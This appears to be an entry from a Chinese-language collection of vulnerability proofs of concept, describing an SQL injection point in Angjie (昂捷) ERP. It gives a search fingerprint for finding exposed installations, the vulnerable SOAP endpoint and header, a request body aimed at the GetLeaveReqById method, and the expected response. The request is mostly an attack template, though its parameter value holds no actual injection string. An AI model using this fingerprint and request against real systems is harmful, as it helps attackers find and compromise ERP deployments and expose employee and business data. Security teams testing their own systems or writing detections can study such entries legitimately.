# 昂捷ERPSQL注入点

- **系统**：昂捷ERPSQL注入点　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1`
- **关键头**：`SOAPAction: [http://tempuri.org/GetLeaveReqById](http://tempuri.org/GetLeaveReqById)`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetLeaveReqById>
<!--type: string-->
<tem:sId>gero et</tem:sId>
</tem:GetLeaveReqById>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—